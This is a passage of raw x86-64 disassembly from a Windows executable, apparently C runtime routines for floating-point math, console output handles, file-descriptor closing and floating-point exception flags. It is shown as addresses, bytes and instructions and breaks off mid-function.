   14000c62b:	c5 f3 59 c1          	vmulsd %xmm1,%xmm1,%xmm0
   14000c62f:	c5 fb 10 1d 59 76 00 	vmovsd 0x7659(%rip),%xmm3        # 0x140013c90
   14000c636:	00 
   14000c637:	c5 fb 10 2d 21 76 00 	vmovsd 0x7621(%rip),%xmm5        # 0x140013c60
   14000c63e:	00 
   14000c63f:	c4 e2 f1 a9 1d 38 76 	vfmadd213sd 0x7638(%rip),%xmm1,%xmm3        # 0x140013c80
   14000c646:	00 00 
   14000c648:	c4 e2 f1 a9 2d cf 75 	vfmadd213sd 0x75cf(%rip),%xmm1,%xmm5        # 0x140013c20
   14000c64f:	00 00 
   14000c651:	f2 0f 10 e0          	movsd  %xmm0,%xmm4
   14000c655:	c4 e2 f1 a9 1d 12 76 	vfmadd213sd 0x7612(%rip),%xmm1,%xmm3        # 0x140013c70
   14000c65c:	00 00 
   14000c65e:	c5 fb 59 e0          	vmulsd %xmm0,%xmm0,%xmm4
   14000c662:	c4 e2 d1 b9 c8       	vfmadd231sd %xmm0,%xmm5,%xmm1
   14000c667:	c4 e2 e1 b9 cc       	vfmadd231sd %xmm4,%xmm3,%xmm1
   14000c66c:	c5 f3 59 0d 3c 75 00 	vmulsd 0x753c(%rip),%xmm1,%xmm1        # 0x140013bb0
   14000c673:	00 
   14000c674:	c5 fb 10 2d 74 75 00 	vmovsd 0x7574(%rip),%xmm5        # 0x140013bf0
   14000c67b:	00 
   14000c67c:	c4 e2 c9 ab e9       	vfmsub213sd %xmm1,%xmm6,%xmm5
   14000c681:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000c687:	48 8d 15 02 7f 00 00 	lea    0x7f02(%rip),%rdx        # 0x140014590
   14000c68e:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000c693:	c5 eb 58 d5          	vaddsd %xmm5,%xmm2,%xmm2
   14000c697:	c4 e2 c9 b9 05 40 75 	vfmadd231sd 0x7540(%rip),%xmm6,%xmm0        # 0x140013be0
   14000c69e:	00 00 
   14000c6a0:	c5 fb 58 c2          	vaddsd %xmm2,%xmm0,%xmm0
   14000c6a4:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000c6aa:	48 83 c4 58          	add    $0x58,%rsp
   14000c6ae:	c3                   	ret
   14000c6af:	90                   	nop
   14000c6b0:	c5 fb 10 15 48 75 00 	vmovsd 0x7548(%rip),%xmm2        # 0x140013c00
   14000c6b7:	00 
   14000c6b8:	c5 fb 5c 05 50 75 00 	vsubsd 0x7550(%rip),%xmm0,%xmm0        # 0x140013c10
   14000c6bf:	00 
   14000c6c0:	c5 eb 58 d0          	vaddsd %xmm0,%xmm2,%xmm2
   14000c6c4:	c5 fb 5e ca          	vdivsd %xmm2,%xmm0,%xmm1
   14000c6c8:	c5 fb 10 25 50 76 00 	vmovsd 0x7650(%rip),%xmm4        # 0x140013d20
   14000c6cf:	00 
   14000c6d0:	c5 fb 10 2d 68 76 00 	vmovsd 0x7668(%rip),%xmm5        # 0x140013d40
   14000c6d7:	00 
   14000c6d8:	c5 fb 59 f1          	vmulsd %xmm1,%xmm0,%xmm6
   14000c6dc:	c5 f3 58 c9          	vaddsd %xmm1,%xmm1,%xmm1
   14000c6e0:	c5 f3 59 d1          	vmulsd %xmm1,%xmm1,%xmm2
   14000c6e4:	c4 e2 e9 a9 25 23 76 	vfmadd213sd 0x7623(%rip),%xmm2,%xmm4        # 0x140013d10
   14000c6eb:	00 00 
   14000c6ed:	c4 e2 e9 a9 2d 3a 76 	vfmadd213sd 0x763a(%rip),%xmm2,%xmm5        # 0x140013d30
   14000c6f4:	00 00 
   14000c6f6:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000c6fa:	c5 db 59 e2          	vmulsd %xmm2,%xmm4,%xmm4
   14000c6fe:	c5 eb 59 d2          	vmulsd %xmm2,%xmm2,%xmm2
   14000c702:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000c706:	c5 d3 59 ea          	vmulsd %xmm2,%xmm5,%xmm5
   14000c70a:	c5 db 58 e5          	vaddsd %xmm5,%xmm4,%xmm4
   14000c70e:	c5 db 5c e6          	vsubsd %xmm6,%xmm4,%xmm4
   14000c712:	c5 f9 db 1d 36 76 00 	vpand  0x7636(%rip),%xmm0,%xmm3        # 0x140013d50
   14000c719:	00 
   14000c71a:	c5 fb 5c c3          	vsubsd %xmm3,%xmm0,%xmm0
   14000c71e:	c5 db 58 e0          	vaddsd %xmm0,%xmm4,%xmm4
   14000c722:	c5 db 59 0d 96 74 00 	vmulsd 0x7496(%rip),%xmm4,%xmm1        # 0x140013bc0
   14000c729:	00 
   14000c72a:	c5 db 59 25 9e 74 00 	vmulsd 0x749e(%rip),%xmm4,%xmm4        # 0x140013bd0
   14000c731:	00 
   14000c732:	c5 e3 59 05 96 74 00 	vmulsd 0x7496(%rip),%xmm3,%xmm0        # 0x140013bd0
   14000c739:	00 
   14000c73a:	c5 e3 59 1d 7e 74 00 	vmulsd 0x747e(%rip),%xmm3,%xmm3        # 0x140013bc0
   14000c741:	00 
   14000c742:	c5 fb 58 c4          	vaddsd %xmm4,%xmm0,%xmm0
   14000c746:	c5 fb 58 c1          	vaddsd %xmm1,%xmm0,%xmm0
   14000c74a:	c5 fb 58 c3          	vaddsd %xmm3,%xmm0,%xmm0
   14000c74e:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000c754:	48 83 c4 58          	add    $0x58,%rsp
   14000c758:	c3                   	ret
   14000c759:	c5 e9 eb 15 af 74 00 	vpor   0x74af(%rip),%xmm2,%xmm2        # 0x140013c10
   14000c760:	00 
   14000c761:	c5 eb 5c 15 a7 74 00 	vsubsd 0x74a7(%rip),%xmm2,%xmm2        # 0x140013c10
   14000c768:	00 
   14000c769:	c5 d1 73 d2 34       	vpsrlq $0x34,%xmm2,%xmm5
   14000c76e:	c5 e9 db 15 0a 74 00 	vpand  0x740a(%rip),%xmm2,%xmm2        # 0x140013b80
   14000c775:	00 
   14000c776:	c5 f9 28 c2          	vmovapd %xmm2,%xmm0
   14000c77a:	c5 d1 fa 2d 2e 75 00 	vpsubd 0x752e(%rip),%xmm5,%xmm5        # 0x140013cb0
   14000c781:	00 
   14000c782:	c5 fa e6 f5          	vcvtdq2pd %xmm5,%xmm6
   14000c786:	e9 40 fe ff ff       	jmp    0x14000c5cb
   14000c78b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000c790:	75 2e                	jne    0x14000c7c0
   14000c792:	c5 fb 10 0d 86 73 00 	vmovsd 0x7386(%rip),%xmm1        # 0x140013b20
   14000c799:	00 
   14000c79a:	44 8b 05 bf 75 00 00 	mov    0x75bf(%rip),%r8d        # 0x140013d60
   14000c7a1:	e8 5a 06 00 00       	call   0x14000ce00
   14000c7a6:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000c7ac:	48 83 c4 58          	add    $0x58,%rsp
   14000c7b0:	c3                   	ret
   14000c7b1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000c7b8:	0f 1f 84 00 00 00 00 
   14000c7bf:	00 
   14000c7c0:	c5 fb 10 0d 78 73 00 	vmovsd 0x7378(%rip),%xmm1        # 0x140013b40
   14000c7c7:	00 
   14000c7c8:	44 8b 05 95 75 00 00 	mov    0x7595(%rip),%r8d        # 0x140013d64
   14000c7cf:	e8 2c 06 00 00       	call   0x14000ce00
   14000c7d4:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000c7da:	48 83 c4 58          	add    $0x58,%rsp
   14000c7de:	c3                   	ret
   14000c7df:	90                   	nop
   14000c7e0:	48 3b 05 49 73 00 00 	cmp    0x7349(%rip),%rax        # 0x140013b30
   14000c7e7:	74 27                	je     0x14000c810
   14000c7e9:	48 3b 05 30 73 00 00 	cmp    0x7330(%rip),%rax        # 0x140013b20
   14000c7f0:	74 ce                	je     0x14000c7c0
   14000c7f2:	48 0b 05 57 73 00 00 	or     0x7357(%rip),%rax        # 0x140013b50
   14000c7f9:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000c7fe:	44 8b 05 63 75 00 00 	mov    0x7563(%rip),%r8d        # 0x140013d68
   14000c805:	e8 f6 05 00 00       	call   0x14000ce00
   14000c80a:	eb 04                	jmp    0x14000c810
   14000c80c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000c810:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000c816:	48 83 c4 58          	add    $0x58,%rsp
   14000c81a:	c3                   	ret
   14000c81b:	cc                   	int3
   14000c81c:	40 53                	rex push %rbx
   14000c81e:	48 83 ec 40          	sub    $0x40,%rsp
   14000c822:	48 8b 05 a7 b1 00 00 	mov    0xb1a7(%rip),%rax        # 0x1400179d0
   14000c829:	33 db                	xor    %ebx,%ebx
   14000c82b:	48 83 f8 fe          	cmp    $0xfffffffffffffffe,%rax
   14000c82f:	75 2e                	jne    0x14000c85f
   14000c831:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000c836:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   14000c83a:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000c83e:	48 8d 0d 2b 75 00 00 	lea    0x752b(%rip),%rcx        # 0x140013d70
   14000c845:	45 33 c9             	xor    %r9d,%r9d
   14000c848:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000c84d:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000c852:	ff 15 b8 19 00 00    	call   *0x19b8(%rip)        # 0x14000e210
   14000c858:	48 89 05 71 b1 00 00 	mov    %rax,0xb171(%rip)        # 0x1400179d0
   14000c85f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c863:	0f 95 c3             	setne  %bl
   14000c866:	8b c3                	mov    %ebx,%eax
   14000c868:	48 83 c4 40          	add    $0x40,%rsp
   14000c86c:	5b                   	pop    %rbx
   14000c86d:	c3                   	ret
   14000c86e:	cc                   	int3
   14000c86f:	cc                   	int3
   14000c870:	48 83 ec 28          	sub    $0x28,%rsp
   14000c874:	48 8b 0d 55 b1 00 00 	mov    0xb155(%rip),%rcx        # 0x1400179d0
   14000c87b:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000c87f:	77 06                	ja     0x14000c887
   14000c881:	ff 15 91 19 00 00    	call   *0x1991(%rip)        # 0x14000e218
   14000c887:	48 83 c4 28          	add    $0x28,%rsp
   14000c88b:	c3                   	ret
   14000c88c:	48 8b c4             	mov    %rsp,%rax
   14000c88f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000c893:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000c897:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000c89b:	57                   	push   %rdi
   14000c89c:	48 83 ec 40          	sub    $0x40,%rsp
   14000c8a0:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   14000c8a5:	49 8b f8             	mov    %r8,%rdi
   14000c8a8:	4d 8b c8             	mov    %r8,%r9
   14000c8ab:	8b f2                	mov    %edx,%esi
   14000c8ad:	44 8b c2             	mov    %edx,%r8d
   14000c8b0:	48 8b e9             	mov    %rcx,%rbp
   14000c8b3:	48 8b d1             	mov    %rcx,%rdx
   14000c8b6:	48 8b 0d 13 b1 00 00 	mov    0xb113(%rip),%rcx        # 0x1400179d0
   14000c8bd:	ff 15 4d 17 00 00    	call   *0x174d(%rip)        # 0x14000e010
   14000c8c3:	8b d8                	mov    %eax,%ebx
   14000c8c5:	85 c0                	test   %eax,%eax
   14000c8c7:	75 6a                	jne    0x14000c933
   14000c8c9:	ff 15 c1 17 00 00    	call   *0x17c1(%rip)        # 0x14000e090
   14000c8cf:	83 f8 06             	cmp    $0x6,%eax
   14000c8d2:	75 5f                	jne    0x14000c933
   14000c8d4:	48 8b 0d f5 b0 00 00 	mov    0xb0f5(%rip),%rcx        # 0x1400179d0
   14000c8db:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000c8df:	77 06                	ja     0x14000c8e7
   14000c8e1:	ff 15 31 19 00 00    	call   *0x1931(%rip)        # 0x14000e218
   14000c8e7:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000c8ed:	48 8d 0d 7c 74 00 00 	lea    0x747c(%rip),%rcx        # 0x140013d70
   14000c8f4:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000c8f9:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000c8ff:	45 33 c9             	xor    %r9d,%r9d
   14000c902:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000c907:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000c90c:	ff 15 fe 18 00 00    	call   *0x18fe(%rip)        # 0x14000e210
   14000c912:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000c918:	4c 8b cf             	mov    %rdi,%r9
   14000c91b:	48 8b c8             	mov    %rax,%rcx
   14000c91e:	48 89 05 ab b0 00 00 	mov    %rax,0xb0ab(%rip)        # 0x1400179d0
   14000c925:	44 8b c6             	mov    %esi,%r8d
   14000c928:	48 8b d5             	mov    %rbp,%rdx
   14000c92b:	ff 15 df 16 00 00    	call   *0x16df(%rip)        # 0x14000e010
   14000c931:	8b d8                	mov    %eax,%ebx
   14000c933:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000c938:	8b c3                	mov    %ebx,%eax
   14000c93a:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000c93f:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000c944:	48 83 c4 40          	add    $0x40,%rsp
   14000c948:	5f                   	pop    %rdi
   14000c949:	c3                   	ret
   14000c94a:	cc                   	int3
   14000c94b:	cc                   	int3
   14000c94c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c951:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000c956:	57                   	push   %rdi
   14000c957:	48 83 ec 20          	sub    $0x20,%rsp
   14000c95b:	49 8b f9             	mov    %r9,%rdi
   14000c95e:	49 8b d8             	mov    %r8,%rbx
   14000c961:	8b 0a                	mov    (%rdx),%ecx
   14000c963:	e8 c8 ae ff ff       	call   0x140007830
   14000c968:	90                   	nop
   14000c969:	48 8b 03             	mov    (%rbx),%rax
   14000c96c:	48 63 08             	movslq (%rax),%rcx
   14000c96f:	48 8b d1             	mov    %rcx,%rdx
   14000c972:	48 8b c1             	mov    %rcx,%rax
   14000c975:	48 c1 f8 06          	sar    $0x6,%rax
   14000c979:	4c 8d 05 d0 b6 00 00 	lea    0xb6d0(%rip),%r8        # 0x140018050
   14000c980:	83 e2 3f             	and    $0x3f,%edx
   14000c983:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000c987:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000c98b:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000c990:	74 09                	je     0x14000c99b
   14000c992:	e8 cd 00 00 00       	call   0x14000ca64
   14000c997:	8b d8                	mov    %eax,%ebx
   14000c999:	eb 0e                	jmp    0x14000c9a9
   14000c99b:	e8 20 8e ff ff       	call   0x1400057c0
   14000c9a0:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c9a6:	83 cb ff             	or     $0xffffffff,%ebx
   14000c9a9:	8b 0f                	mov    (%rdi),%ecx
   14000c9ab:	e8 a8 ae ff ff       	call   0x140007858
   14000c9b0:	8b c3                	mov    %ebx,%eax
   14000c9b2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c9b7:	48 83 c4 20          	add    $0x20,%rsp
   14000c9bb:	5f                   	pop    %rdi
   14000c9bc:	c3                   	ret
   14000c9bd:	cc                   	int3
   14000c9be:	cc                   	int3
   14000c9bf:	cc                   	int3
   14000c9c0:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c9c4:	48 83 ec 38          	sub    $0x38,%rsp
   14000c9c8:	48 63 d1             	movslq %ecx,%rdx
   14000c9cb:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000c9ce:	75 15                	jne    0x14000c9e5
   14000c9d0:	e8 cb 8d ff ff       	call   0x1400057a0
   14000c9d5:	83 20 00             	andl   $0x0,(%rax)
   14000c9d8:	e8 e3 8d ff ff       	call   0x1400057c0
   14000c9dd:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c9e3:	eb 74                	jmp    0x14000ca59
   14000c9e5:	85 c9                	test   %ecx,%ecx
   14000c9e7:	78 58                	js     0x14000ca41
   14000c9e9:	3b 15 61 ba 00 00    	cmp    0xba61(%rip),%edx        # 0x140018450
   14000c9ef:	73 50                	jae    0x14000ca41
   14000c9f1:	48 8b ca             	mov    %rdx,%rcx
   14000c9f4:	4c 8d 05 55 b6 00 00 	lea    0xb655(%rip),%r8        # 0x140018050
   14000c9fb:	83 e1 3f             	and    $0x3f,%ecx
   14000c9fe:	48 8b c2             	mov    %rdx,%rax
   14000ca01:	48 c1 f8 06          	sar    $0x6,%rax
   14000ca05:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000ca09:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000ca0d:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000ca12:	74 2d                	je     0x14000ca41
   14000ca14:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000ca19:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000ca1d:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000ca21:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000ca26:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000ca2b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000ca30:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000ca35:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000ca3a:	e8 0d ff ff ff       	call   0x14000c94c
   14000ca3f:	eb 1b                	jmp    0x14000ca5c
   14000ca41:	e8 5a 8d ff ff       	call   0x1400057a0
   14000ca46:	83 20 00             	andl   $0x0,(%rax)
   14000ca49:	e8 72 8d ff ff       	call   0x1400057c0
   14000ca4e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000ca54:	e8 47 8c ff ff       	call   0x1400056a0
   14000ca59:	83 c8 ff             	or     $0xffffffff,%eax
   14000ca5c:	48 83 c4 38          	add    $0x38,%rsp
   14000ca60:	c3                   	ret
   14000ca61:	cc                   	int3
   14000ca62:	cc                   	int3
   14000ca63:	cc                   	int3
   14000ca64:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ca69:	57                   	push   %rdi
   14000ca6a:	48 83 ec 20          	sub    $0x20,%rsp
   14000ca6e:	48 63 f9             	movslq %ecx,%rdi
   14000ca71:	8b cf                	mov    %edi,%ecx
   14000ca73:	e8 c4 ae ff ff       	call   0x14000793c
   14000ca78:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000ca7c:	75 04                	jne    0x14000ca82
   14000ca7e:	33 db                	xor    %ebx,%ebx
   14000ca80:	eb 5a                	jmp    0x14000cadc
   14000ca82:	48 8b 05 c7 b5 00 00 	mov    0xb5c7(%rip),%rax        # 0x140018050
   14000ca89:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000ca8e:	83 ff 01             	cmp    $0x1,%edi
   14000ca91:	75 09                	jne    0x14000ca9c
   14000ca93:	40 84 b8 c8 00 00 00 	test   %dil,0xc8(%rax)
   14000ca9a:	75 0d                	jne    0x14000caa9
   14000ca9c:	3b f9                	cmp    %ecx,%edi
   14000ca9e:	75 20                	jne    0x14000cac0
   14000caa0:	f6 80 80 00 00 00 01 	testb  $0x1,0x80(%rax)
   14000caa7:	74 17                	je     0x14000cac0
   14000caa9:	e8 8e ae ff ff       	call   0x14000793c
   14000caae:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000cab3:	48 8b d8             	mov    %rax,%rbx
   14000cab6:	e8 81 ae ff ff       	call   0x14000793c
   14000cabb:	48 3b c3             	cmp    %rbx,%rax
   14000cabe:	74 be                	je     0x14000ca7e
   14000cac0:	8b cf                	mov    %edi,%ecx
   14000cac2:	e8 75 ae ff ff       	call   0x14000793c
   14000cac7:	48 8b c8             	mov    %rax,%rcx
   14000caca:	ff 15 48 17 00 00    	call   *0x1748(%rip)        # 0x14000e218
   14000cad0:	85 c0                	test   %eax,%eax
   14000cad2:	75 aa                	jne    0x14000ca7e
   14000cad4:	ff 15 b6 15 00 00    	call   *0x15b6(%rip)        # 0x14000e090
   14000cada:	8b d8                	mov    %eax,%ebx
   14000cadc:	8b cf                	mov    %edi,%ecx
   14000cade:	e8 9d ad ff ff       	call   0x140007880
   14000cae3:	48 8b d7             	mov    %rdi,%rdx
   14000cae6:	4c 8d 05 63 b5 00 00 	lea    0xb563(%rip),%r8        # 0x140018050
   14000caed:	83 e2 3f             	and    $0x3f,%edx
   14000caf0:	48 8b cf             	mov    %rdi,%rcx
   14000caf3:	48 c1 f9 06          	sar    $0x6,%rcx
   14000caf7:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000cafb:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000caff:	c6 44 d1 38 00       	movb   $0x0,0x38(%rcx,%rdx,8)
   14000cb04:	85 db                	test   %ebx,%ebx
   14000cb06:	74 0c                	je     0x14000cb14
   14000cb08:	8b cb                	mov    %ebx,%ecx
   14000cb0a:	e8 41 8c ff ff       	call   0x140005750
   14000cb0f:	83 c8 ff             	or     $0xffffffff,%eax
   14000cb12:	eb 02                	jmp    0x14000cb16
   14000cb14:	33 c0                	xor    %eax,%eax
   14000cb16:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000cb1b:	48 83 c4 20          	add    $0x20,%rsp
   14000cb1f:	5f                   	pop    %rdi
   14000cb20:	c3                   	ret
   14000cb21:	cc                   	int3
   14000cb22:	cc                   	int3
   14000cb23:	cc                   	int3
   14000cb24:	83 49 18 ff          	orl    $0xffffffff,0x18(%rcx)
   14000cb28:	33 c0                	xor    %eax,%eax
   14000cb2a:	48 89 01             	mov    %rax,(%rcx)
   14000cb2d:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000cb31:	89 41 10             	mov    %eax,0x10(%rcx)
   14000cb34:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   14000cb38:	48 89 41 28          	mov    %rax,0x28(%rcx)
   14000cb3c:	87 41 14             	xchg   %eax,0x14(%rcx)
   14000cb3f:	c3                   	ret
   14000cb40:	48 8b c4             	mov    %rsp,%rax
   14000cb43:	53                   	push   %rbx
   14000cb44:	48 83 ec 50          	sub    $0x50,%rsp
   14000cb48:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   14000cb4f:	00 00 
   14000cb51:	8b d9                	mov    %ecx,%ebx
   14000cb53:	f2 0f 10 8c 24 88 00 	movsd  0x88(%rsp),%xmm1
   14000cb5a:	00 00 
   14000cb5c:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000cb61:	89 48 c8             	mov    %ecx,-0x38(%rax)
   14000cb64:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000cb6b:	00 
   14000cb6c:	f2 0f 11 40 e0       	movsd  %xmm0,-0x20(%rax)
   14000cb71:	f2 0f 11 48 e8       	movsd  %xmm1,-0x18(%rax)
   14000cb76:	f2 0f 11 58 d8       	movsd  %xmm3,-0x28(%rax)
   14000cb7b:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   14000cb7f:	e8 24 07 00 00       	call   0x14000d2a8
   14000cb84:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000cb89:	e8 36 6e ff ff       	call   0x1400039c4
   14000cb8e:	85 c0                	test   %eax,%eax
   14000cb90:	75 07                	jne    0x14000cb99
   14000cb92:	8b cb                	mov    %ebx,%ecx
   14000cb94:	e8 bf 06 00 00       	call   0x14000d258
   14000cb99:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000cb9f:	48 83 c4 50          	add    $0x50,%rsp
   14000cba3:	5b                   	pop    %rbx
   14000cba4:	c3                   	ret
   14000cba5:	cc                   	int3
   14000cba6:	cc                   	int3
   14000cba7:	cc                   	int3
   14000cba8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000cbad:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000cbb2:	57                   	push   %rdi
   14000cbb3:	48 83 ec 20          	sub    $0x20,%rsp
   14000cbb7:	8b d9                	mov    %ecx,%ebx
   14000cbb9:	48 8b f2             	mov    %rdx,%rsi
   14000cbbc:	83 e3 1f             	and    $0x1f,%ebx
   14000cbbf:	8b f9                	mov    %ecx,%edi
   14000cbc1:	f6 c1 08             	test   $0x8,%cl
   14000cbc4:	74 14                	je     0x14000cbda
   14000cbc6:	40 84 f6             	test   %sil,%sil
   14000cbc9:	79 0f                	jns    0x14000cbda
   14000cbcb:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000cbd0:	e8 4f 07 00 00       	call   0x14000d324
   14000cbd5:	83 e3 f7             	and    $0xfffffff7,%ebx
   14000cbd8:	eb 57                	jmp    0x14000cc31
   14000cbda:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000cbdf:	40 84 f9             	test   %dil,%cl
   14000cbe2:	74 11                	je     0x14000cbf5
   14000cbe4:	48 0f ba e6 09       	bt     $0x9,%rsi
   14000cbe9:	73 0a                	jae    0x14000cbf5
   14000cbeb:	e8 34 07 00 00       	call   0x14000d324
   14000cbf0:	83 e3 fb             	and    $0xfffffffb,%ebx
   14000cbf3:	eb 3c                	jmp    0x14000cc31
   14000cbf5:	40 f6 c7 01          	test   $0x1,%dil
   14000cbf9:	74 16                	je     0x14000cc11
   14000cbfb:	48 0f ba e6 0a       	bt     $0xa,%rsi
   14000cc00:	73 0f                	jae    0x14000cc11
   14000cc02:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000cc07:	e8 18 07 00 00       	call   0x14000d324
   14000cc0c:	83 e3 fe             	and    $0xfffffffe,%ebx
   14000cc0f:	eb 20                	jmp    0x14000cc31
   14000cc11:	40 f6 c7 02          	test   $0x2,%dil
   14000cc15:	74 1a                	je     0x14000cc31
   14000cc17:	48 0f ba e6 0b       	bt     $0xb,%rsi
   14000cc1c:	73 13                	jae    0x14000cc31
   14000cc1e:	40 f6 c7 10          	test   $0x10,%dil
   14000cc22:	74 0a                	je     0x14000cc2e
   14000cc24:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000cc29:	e8 f6 06 00 00       	call   0x14000d324
   14000cc2e:	83 e3 fd             	and    $0xfffffffd,%ebx
   14000cc31:	40 f6 c7 10          	test   $0x10,%dil
   14000cc35:	74 14                	je     0x14000cc4b
   14000cc37:	48 0f ba e6 0c       	bt     $0xc,%rsi
   14000cc3c:	73 0d                	jae    0x14000cc4b
   14000cc3e:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000cc43:	e8 dc 06 00 00       	call   0x14000d324
   14000cc48:	83 e3 ef             	and    $0xffffffef,%ebx
   14000cc4b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000cc50:	33 c0                	xor    %eax,%eax
   14000cc52:	85 db                	test   %ebx,%ebx
   14000cc54:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000cc59:	0f 94 c0             	sete   %al
   14000cc5c:	48 83 c4 20          	add    $0x20,%rsp
   14000cc60:	5f                   	pop    %rdi
   14000cc61:	c3                   	ret
   14000cc62:	cc                   	int3
   14000cc63:	cc                   	int3
   14000cc64:	48 8b c4             	mov    %rsp,%rax
   14000cc67:	55                   	push   %rbp
   14000cc68:	53                   	push   %rbx
   14000cc69:	56                   	push   %rsi
   14000cc6a:	57                   	push   %rdi
   14000cc6b:	41 56                	push   %r14
   14000cc6d:	48 8d 68 c9          	lea    -0x37(%rax),%rbp
   14000cc71:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   14000cc78:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   14000cc7c:	48 8b 05 a5 a3 00 00 	mov    0xa3a5(%rip),%rax        # 0x140017028
   14000cc83:	48 33 c4             	xor    %rsp,%rax
   14000cc86:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000cc8a:	8b f2                	mov    %edx,%esi
   14000cc8c:	4c 8b f1             	mov    %rcx,%r14
   14000cc8f:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000cc94:	b9 80 1f 00 00       	mov    $0x1f80,%ecx
   14000cc99:	41 8b f9             	mov    %r9d,%edi
   14000cc9c:	49 8b d8             	mov    %r8,%rbx
   14000cc9f:	e8 04 06 00 00       	call   0x14000d2a8
   14000cca4:	8b 4d 5f             	mov    0x5f(%rbp),%ecx
   14000cca7:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000ccac:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   14000ccb1:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   14000ccb7:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   14000ccbc:	f2 0f 11 44 24 48    	movsd  %xmm0,0x48(%rsp)
   14000ccc2:	e8 e1 fe ff ff       	call   0x14000cba8
   14000ccc7:	f2 0f 10 75 77       	movsd  0x77(%rbp),%xmm6
   14000cccc:	85 c0                	test   %eax,%eax
   14000ccce:	75 40                	jne    0x14000cd10
   14000ccd0:	83 7d 7f 02          	cmpl   $0x2,0x7f(%rbp)
